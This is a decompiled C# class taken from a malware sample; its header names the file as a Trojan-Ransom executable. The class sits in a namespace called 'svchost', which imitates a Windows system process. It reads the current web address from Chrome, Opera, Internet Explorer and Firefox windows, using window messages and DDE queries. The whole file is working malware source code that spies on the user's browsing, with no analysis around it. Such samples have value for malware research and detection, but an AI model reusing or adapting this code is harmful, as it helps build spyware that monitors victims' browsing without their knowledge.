// Decompiled with JetBrains decompiler
// Type: svchost.UrlGetter
// Assembly: svchost, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5F810CD7-4751-4516-A451-E3D5DB1E7D3C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00060-msil\Trojan-Ransom.Win32.Foreign.mxsg-767d7a244c93f1b0715b0106741f32dbd0bce3a7.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace svchost
{
  internal static class UrlGetter
  {
    private const uint DMLERR_NO_ERROR = 0;
    private const uint CF_TEXT = 1;
    private const uint XCLASS_DATA = 8192;
    private const uint XTYP_REQUEST = 8368;

    public static string getUrl(IntPtr handle, string title)
    {
      if (title.Contains("Chrome"))
        return UrlGetter.getChromeUrl(handle);
      if (title.Contains("Opera"))
        return UrlGetter.getOperaUrl();
      if (title.Contains("Internet Explorer"))
        return UrlGetter.getIEUrl();
      return title.Contains("Firefox") ? UrlGetter.getFirefoxUrl() : (string) null;
    }

    private static string getChromeUrl(IntPtr handle)
    {
      try
      {
        IntPtr windowEx = UrlGetter.FindWindowEx(handle, IntPtr.Zero, "Chrome_OmniboxView", IntPtr.Zero);
        StringBuilder ClassName = new StringBuilder(256);
        UrlGetter.SendMessage(windowEx, 13, 256, ClassName);
        return !string.IsNullOrEmpty(ClassName.ToString()) ? "[" + ClassName.ToString() + "]" : (string) null;
      }
      catch
      {
        return (string) null;
      }
    }

    private static string getOperaUrl()
    {
      string operaUrl = (string) null;
      try
      {
        uint pidInst = 0;
        if (UrlGetter.DdeInitialize(ref pidInst, IntPtr.Zero, UrlGetter.DdeFlags.APPCMD_CLIENTONLY, 0U) != 0U)
          return (string) null;
        IntPtr stringHandle1 = UrlGetter.DdeCreateStringHandle(pidInst, "Opera", 0);
        IntPtr stringHandle2 = UrlGetter.DdeCreateStringHandle(pidInst, "WWW_GetWindowInfo", 0);
        IntPtr hConv = UrlGetter.DdeConnect(pidInst, stringHandle1, stringHandle2, IntPtr.Zero);
        UrlGetter.DdeFreeStringHandle(pidInst, stringHandle1);
        UrlGetter.DdeFreeStringHandle(pidInst, stringHandle2);
        if (hConv != IntPtr.Zero)
        {
          IntPtr stringHandle3 = UrlGetter.DdeCreateStringHandle(pidInst, "0xFFFFFFFF", 0);
          IntPtr hData = UrlGetter.DdeClientTransaction((byte[]) null, 0, hConv, stringHandle3, 1U, 8368U, 0, IntPtr.Zero);
          if (hData != IntPtr.Zero)
          {
            StringBuilder pDst = new StringBuilder(512);
            if (UrlGetter.BrowserDdeGetData(hData, pDst, pDst.Capacity, 0) != 0U)
              operaUrl = string.IsNullOrEmpty(pDst.ToString()) ? (string) null : "[" + pDst.ToString().Remove(pDst.ToString().IndexOf(",")).Replace("\"", "") + "]";
          }
          UrlGetter.DdeFreeStringHandle(pidInst, stringHandle3);
          UrlGetter.DdeDisconnect(hConv);
        }
        UrlGetter.DdeUninitialize(pidInst);
        return operaUrl;
      }
      catch
      {
        return (string) null;
      }
    }

    private static string getFirefoxUrl()
    {
      string firefoxUrl = (string) null;
      try
      {
        uint pidInst = 0;
        if (UrlGetter.DdeInitialize(ref pidInst, IntPtr.Zero, UrlGetter.DdeFlags.APPCMD_CLIENTONLY, 0U) != 0U)
          return (string) null;
        IntPtr stringHandle1 = UrlGetter.DdeCreateStringHandle(pidInst, "Firefox", 0);
        IntPtr stringHandle2 = UrlGetter.DdeCreateStringHandle(pidInst, "WWW_GetWindowInfo", 0);
        IntPtr hConv = UrlGetter.DdeConnect(pidInst, stringHandle1, stringHandle2, IntPtr.Zero);
        UrlGetter.DdeFreeStringHandle(pidInst, stringHandle1);
        UrlGetter.DdeFreeStringHandle(pidInst, stringHandle2);
        if (hConv != IntPtr.Zero)
        {
          IntPtr stringHandle3 = UrlGetter.DdeCreateStringHandle(pidInst, "0xFFFFFFFF", 0);
          IntPtr hData = UrlGetter.DdeClientTransaction((byte[]) null, 0, hConv, stringHandle3, 1U, 8368U, 0, IntPtr.Zero);
          if (hData != IntPtr.Zero)
          {
            StringBuilder pDst = new StringBuilder(512);
            if (UrlGetter.BrowserDdeGetData(hData, pDst, pDst.Capacity, 0) != 0U)
              firefoxUrl = string.IsNullOrEmpty(pDst.ToString()) ? (string) null : "[" + pDst.ToString().Remove(pDst.ToString().IndexOf(",")).Replace("\"", "") + "]";
          }
          UrlGetter.DdeFreeStringHandle(pidInst, stringHandle3);
          UrlGetter.DdeDisconnect(hConv);
        }
        UrlGetter.DdeUninitialize(pidInst);
        return firefoxUrl;
      }
      catch
      {
        return (string) null;
      }
    }

    private static string getIEUrl()
    {
      string ieUrl = (string) null;
      try
      {
        uint pidInst = 0;
        if (UrlGetter.DdeInitialize(ref pidInst, IntPtr.Zero, UrlGetter.DdeFlags.APPCMD_CLIENTONLY, 0U) != 0U)
          return (string) null;
        IntPtr stringHandle1 = UrlGetter.DdeCreateStringHandle(pidInst, "IExplore", 0);
        IntPtr stringHandle2 = UrlGetter.DdeCreateStringHandle(pidInst, "WWW_GetWindowInfo", 0);
        IntPtr hConv = UrlGetter.DdeConnect(pidInst, stringHandle1, stringHandle2, IntPtr.Zero);
        UrlGetter.DdeFreeStringHandle(pidInst, stringHandle1);
        UrlGetter.DdeFreeStringHandle(pidInst, stringHandle2);
        if (hConv != IntPtr.Zero)
        {
          IntPtr stringHandle3 = UrlGetter.DdeCreateStringHandle(pidInst, "0xFFFFFFFF", 0);
          IntPtr hData = UrlGetter.DdeClientTransaction((byte[]) null, 0, hConv, stringHandle3, 1U, 8368U, 0, IntPtr.Zero);
          if (hData != IntPtr.Zero)
          {
            StringBuilder pDst = new StringBuilder(512);
            if (UrlGetter.BrowserDdeGetData(hData, pDst, pDst.Capacity, 0) != 0U)
              ieUrl = string.IsNullOrEmpty(pDst.ToString()) ? (string) null : "[" + pDst.ToString().Remove(pDst.ToString().IndexOf(",")).Replace("\"", "") + "]";
          }
          UrlGetter.DdeFreeStringHandle(pidInst, stringHandle3);
          UrlGetter.DdeDisconnect(hConv);
        }
        UrlGetter.DdeUninitialize(pidInst);
        return ieUrl;
      }
      catch
      {
        return (string) null;
      }
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr FindWindowEx(
      IntPtr parentHandle,
      IntPtr childAfter,
      string className,
      IntPtr windowTitle);

    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SendMessage(
      IntPtr hWnd,
      int msg,
      int wParam,
      StringBuilder ClassName);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern uint DdeInitialize(
      [In, Out] ref uint pidInst,
      [In] IntPtr pfnCallback,
      [In] UrlGetter.DdeFlags afCmd,
      [In] uint ulRes);

    [DllImport("user32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr DdeCreateStringHandle(
      [In] uint idInst,
      [In] string psz,
      [In] int iCodePage);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DdeFreeStringHandle([In] uint idInst, [In] IntPtr hsz);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr DdeConnect(
      [In] uint idInst,
      [In] IntPtr hszService,
      [In] IntPtr hszTopic,
      [In, Optional] IntPtr pCC);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DdeDisconnect([In] IntPtr hConv);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern IntPtr DdeClientTransaction(
      [In, Optional] byte[] pData,
      [In] int cbData,
      [In] IntPtr hConv,
      [In, Optional] IntPtr hszItem,
      [In] uint wFmt,
      [In] uint wType,
      [In] int dwTimeout,
      [Out, Optional] IntPtr pdwResult);

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint DdeGetData([In] IntPtr hData, [Out] byte[] pDst, [In] int cbMax, [In] int cbOff);

    [DllImport("user32.dll", EntryPoint = "DdeGetData", SetLastError = true)]
    private static extern uint BrowserDdeGetData(
      [In] IntPtr hData,
      [Out] StringBuilder pDst,
      [In] int cbMax,
      [In] int cbOff);

    [DllImport("user32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DdeUninitialize([In] uint idInst);

    [Flags]
    private enum DdeFlags : uint
    {
      APPCLASS_STANDARD = 0,
      APPCMD_CLIENTONLY = 16, // 0x00000010
    }
  }
}
